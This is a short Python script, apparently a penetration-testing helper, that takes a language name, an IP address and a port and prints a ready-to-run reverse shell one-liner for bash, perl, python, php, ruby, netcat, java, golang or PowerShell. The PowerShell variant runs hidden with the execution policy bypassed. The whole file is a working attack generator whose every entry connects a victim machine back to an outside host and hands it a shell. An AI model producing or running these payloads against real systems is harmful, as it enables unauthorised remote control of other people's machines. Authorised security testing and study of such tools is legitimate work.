import argparse 
    
# Initialize parser 
parser = argparse.ArgumentParser( usage = '''python.py -l [lang] -ip [ip_addr] -p [port] \n
    languge option: \n    -l [bash] : for bash reverse shell 
    -l [perl] : for perl reverse shell
    -l [python] : for python reverse shell 
    -l [php] : for php reverse shell 
    -l [ruby] : for ruby reverse shell 
    -l [nc] : for netcat reverse shell 
    -l [java] : for java reverse shell
    -l [golang] : for golang reverse shell
    -l [powershell] : for powershell reverse shell''') 

# Adding optional argument 
parser.add_argument("-l","--lang",required = True, help = "Enter language or tool") 
parser.add_argument("-ip","--ip_addr",required = True, help = "Enter ip address") 
parser.add_argument("-p","--port",required = True, help = "Enter port") 

# Read arguments from command line 
args = parser.parse_args() 

# Initialize the ip-address,port and language
n=args.lang
ip=args.ip_addr
port=args.port

def reverse_shell(arg): 
    switch = { 
        'bash': "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1", 
        'perl': "perl -e ""use Socket;$i=\""+ip+"\";$p="+port+";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'", 
        'python': "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ip+"\","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'", 
        'php': "php -r \'$sock=fsockopen(\""+ip+"\","+port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");\'",
        'ruby': "ruby -rsocket -e'f=TCPSocket.open(\""+ip+"\","+port+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'",
        'nc': "nc -e /bin/sh " +ip+" "+port,
        'java': "r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]) p.waitFor()",
        'golang': "echo \'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\""+ip+":"+port+"\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        'powershell': "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+ip+"\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    } 
  
    return switch.get(arg, "Not Found") 
print (reverse_shell(n)) 
